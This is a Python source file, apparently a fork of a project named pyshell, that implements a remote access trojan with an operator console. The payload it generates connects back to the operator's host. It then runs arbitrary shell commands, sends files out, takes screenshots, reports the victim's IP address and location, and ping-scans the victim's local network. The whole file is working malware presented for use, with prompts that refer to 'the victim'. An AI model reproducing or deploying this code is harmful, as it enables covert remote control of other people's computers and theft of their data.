"""
This project is a fork of https://github.com/knassar702/pyshell
Author: Khaled Nasser (https://github.com/knassar702)
Maintainer: Arnav Padwal (https://github.com/arnavpadwal)
License: GPL 3.0
"""

import os
import sys
import socket
import random
import subprocess
from time import sleep


class Utils:
    @staticmethod
    def restart():
        python = sys.executable
        os.execl(python, python, *sys.argv)


class Payload:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.modules_loaded = True
        self.s = None
        self.l = random.randint(1, 100000)
        self.setup()

    def setup(self):
        try:
            import nmap3
            import pyscreenshot
            import requests
        except ImportError:
            self.modules_loaded = False
            self.send_error("Your Victim needs these modules: requests, python3-nmap, pyscreenshot.")
        if self.modules_loaded:
            self.nm = nmap3.NmapScanTechniques()
            self.connect()

    def connect(self):
        try:
            self.s = socket.socket()
            self.s.connect((self.host, self.port))
            self.s.sendall(b"Connected successfully!")
        except:
            Utils.restart()

    def nmap_scan(self, ip):
        try:
            scan_data = self.nm.nmap_ping_scan(ip)
            for host in scan_data.keys():
                if scan_data[host].get('state') == 'up':
                    self.s.sendall(host.encode())
            self.s.sendall(b"stop")
        except Exception as e:
            self.send_error(str(e))

    def handle_commands(self):
        while True:
            cmd = self.s.recv(1024).decode().strip()
            if cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:])
                    self.s.sendall(b"Directory changed")
                except FileNotFoundError:
                    self.send_error("File Not Found")
            elif cmd == 'download':
                self.s.sendall(b"name")
                file_name = self.s.recv(1024).decode().strip()
                self.download_file(file_name)
            elif cmd == 'upload':
                self.upload_file()
            elif cmd == 'screenshot':
                self.take_screenshot()
            elif cmd == 'address':
                self.send_address()
            elif cmd == 're()':
                self.restart()
            elif cmd.startswith('netscan'):
                ip = cmd.split()[-1]
                self.nmap_scan(ip + '/24')
            else:
                self.execute_command(cmd)

    def download_file(self, file_name):
        try:
            with open(file_name, 'rb') as file:
                while chunk := file.read(1024):
                    self.s.sendall(chunk)
            self.s.sendall(b"[+] Done")
        except FileNotFoundError:
            self.send_error("[-] ERROR")

    def upload_file(self):
        self.s.sendall(b"ok")
        file_name = f"{self.l}.pyshell_reborn"
        with open(file_name, 'wb') as file:
            while True:
                data = self.s.recv(1024)
                if not data:
                    break
                file.write(data)
        self.s.sendall(b"[+] Done")

    def take_screenshot(self):
        try:
            import pyscreenshot as ImageGrab
            screenshot = ImageGrab.grab()
            file_name = f"{self.l}.png"
            screenshot.save(file_name)
            self.s.sendall(f"Taked: {file_name}".encode())
        except Exception as e:
            self.send_error(str(e))

    def send_address(self):
        try:
            import requests
            res = requests.get('https://ipinfo.io/')
            data = res.json()
            address_info = f"""
            IP: {data['ip']}
            City: {data['city']}
            Latitude: {data['loc'].split(',')[0]}
            Longitude: {data['loc'].split(',')[1]}
            """
            self.s.sendall(address_info.encode())
        except Exception as e:
            self.send_error(str(e))

    def execute_command(self, cmd):
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.s.sendall(result.stdout + result.stderr)

    def send_error(self, message):
        self.s.sendall(f"[!] {message}".encode())

    def restart(self):
        self.s.close()
        sleep(1.5)
        Utils.restart()


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client_socket = None

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.port))
            server_socket.listen(1)
            print("[+] Waiting for the victim...")
            self.client_socket, _ = server_socket.accept()
            print("[+] Connected!")
            self.handle_client()

    def handle_client(self):
        while True:
            command = input(">>>> ").strip()
            if command in ["exit", "quit"]:
                break
            self.client_socket.sendall(command.encode())
            response = self.client_socket.recv(1024).decode()
            print(response)

    def send_command(self, command):
        self.client_socket.sendall(command.encode())
        response = self.client_socket.recv(1024).decode()
        print(response)


def make_payload(host, port, path):
    payload_code = """
#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import random
from time import sleep

class Payload:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.modules_loaded = True
        self.s = None
        self.l = random.randint(1, 100000)
        self.setup()

    def setup(self):
        try:
            import nmap3
            import pyscreenshot
            import requests
        except ImportError:
            self.modules_loaded = False
            self.send_error("Your Victim needs these modules: requests, python3-nmap, pyscreenshot.")
        if self.modules_loaded:
            self.nm = nmap3.NmapScanTechniques()
            self.connect()

    def connect(self):
        try:
            self.s = socket.socket()
            self.s.connect((self.host, self.port))
            self.s.sendall(b"Connected successfully")
        except:
            self.restart()

    def nmap_scan(self, ip):
        try:
            scan_data = self.nm.nmap_ping_scan(ip)
            for host in scan_data.keys():
                if scan_data[host].get('state') == 'up':
                    self.s.sendall(host.encode())
            self.s.sendall(b"stop")
        except Exception as e:
            self.send_error(str(e))

    def handle_commands(self):
        while True:
            cmd = self.s.recv(1024).decode().strip()
            if cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:])
                    self.s.sendall(b"Directory changed")
                except FileNotFoundError:
                    self.send_error("File Not Found")
            elif cmd == 'download':
                self.s.sendall(b"name")
                file_name = self.s.recv(1024).decode().strip()
                self.download_file(file_name)
            elif cmd == 'upload':
                self.upload_file()
            elif cmd == 'screenshot':
                self.take_screenshot()
            elif cmd == 'address':
                self.send_address()
            elif cmd == 're()':
                self.restart()
            elif cmd.startswith('netscan'):
                ip = cmd.split()[-1]
                self.nmap_scan(ip + '/24')
            else:
                self.execute_command(cmd)

    def download_file(self, file_name):
        try:
            with open(file_name, 'rb') as file:
                while chunk := file.read(1024):
                    self.s.sendall(chunk)
            self.s.sendall(b"[+] Done")
        except FileNotFoundError:
            self.send_error("[-] ERROR")

    def upload_file(self):
        self.s.sendall(b"ok")
        file_name = f"{self.l}.pyshell_reborn"
        with open(file_name, 'wb') as file:
            while True:
                data = self.s.recv(1024)
                if not data:
                    break
                file.write(data)
        self.s.sendall(b"[+] Done")

    def take_screenshot(self):
        try:
            import pyscreenshot as ImageGrab
            screenshot = ImageGrab.grab()
            file_name = f"{self.l}.png"
            screenshot.save(file_name)
            self.s.sendall(f"Taked: {file_name}".encode())
        except Exception as e:
            self.send_error(str(e))

    def send_address(self):
        try:
            import requests
            res = requests.get('https://ipinfo.io/')
            data = res.json()
            address_info = f"IP: {data['ip']}\nCity: {data['city']}\nLatitude: {data['loc'].split(',')[0]}\nLongitude: {data['loc'].split(',')[1]}"
            self.s.sendall(address_info.encode())
        except Exception as e:
            self.send_error(str(e))

    def execute_command(self, cmd):
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.s.sendall(result.stdout + result.stderr)

    def send_error(self, message):
        self.s.sendall(f"[!] {message}".encode())

    def restart(self):
        self.s.close()
        sleep(1.5)
        self.__init__(self.host, self.port)


if __name__ == "__main__":
    p = Payload('{host}', {port})
    p.handle_commands()
"""
    with open(path, 'w') as f:
        f.write(payload_code)


def main():
    host = input("Enter the host: ")
    port = int(input("Enter the port: "))
    payload_path = input("Enter the payload path: ")
    make_payload(host, port, payload_path)
    server = Server(host, port)
    server.start()


if __name__ == "__main__":
    main()
